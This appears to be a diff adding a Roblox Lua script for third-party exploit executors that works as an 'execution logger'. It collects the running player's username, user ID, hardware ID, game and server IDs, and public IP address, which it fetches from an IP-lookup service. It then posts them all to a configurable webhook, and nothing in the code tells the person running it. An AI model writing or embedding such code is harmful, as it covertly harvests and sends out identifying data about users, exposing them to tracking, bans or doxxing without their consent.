@@ -1,0 +1,97 @@
+_G.webhook = "YOUR_WEBHOOK_URL"
+_G.webhook_name = "Execution Logs"
+_G.webhook_emb_color = "#FFFFFF"
+_G.log = true
+_G.log_username = true
+_G.log_display_name = true
+_G.log_hwid = true
+_G.log_job_id = true
+_G.log_game_name = true
+_G.log_game_id = true
+_G.log_player_id = true
+
+if not _G.log then return end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+local ip = "Unknown"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+local hwid = "Unknown"
+pcall(function()
+    if gethwid then
+        hwid = gethwid()
+    elseif syn and syn.gethwid then
+        hwid = syn.gethwid()
+    else
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    end
+end)
+
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+local colorDec = tonumber("0x" .. (_G.webhook_emb_color:gsub("#", ""))) or 16777215
+
+local fields = {}
+
+if _G.log_username and localPlayer then
+    table.insert(fields, {["name"] = "Username", ["value"] = localPlayer.Name, ["inline"] = true})
+end
+
+if _G.log_display_name and localPlayer then
+    table.insert(fields, {["name"] = "Display Name", ["value"] = localPlayer.DisplayName, ["inline"] = true})
+end
+
+if _G.log_player_id and localPlayer then
+    table.insert(fields, {["name"] = "Player ID", ["value"] = tostring(localPlayer.UserId), ["inline"] = true})
+end
+
+if _G.log_hwid then
+    table.insert(fields, {["name"] = "HWID", ["value"] = "`" .. tostring(hwid) .. "`", ["inline"] = false})
+end
+
+if _G.log_game_name then
+    table.insert(fields, {["name"] = "Game Name", ["value"] = tostring(gameName), ["inline"] = true})
+end
+
+if _G.log_game_id then
+    table.insert(fields, {["name"] = "Game ID", ["value"] = tostring(game.PlaceId), ["inline"] = true})
+end
+
+if _G.log_job_id then
+    table.insert(fields, {["name"] = "Job ID", ["value"] = "`" .. tostring(game.JobId) .. "`", ["inline"] = false})
+end
+
+table.insert(fields, {["name"] = "IP Address", ["value"] = "`" .. tostring(ip) .. "`", ["inline"] = false})
+
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = tostring(_G.webhook_name),
+            ["color"] = colorDec,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Executed at " .. os.date("%Y-%m-%d %H:%M:%S")
+            }
+        }
+    }
+}
+
+local httpRequest = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+if httpRequest then
+    httpRequest({
+        Url = tostring(_G.webhook),
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end
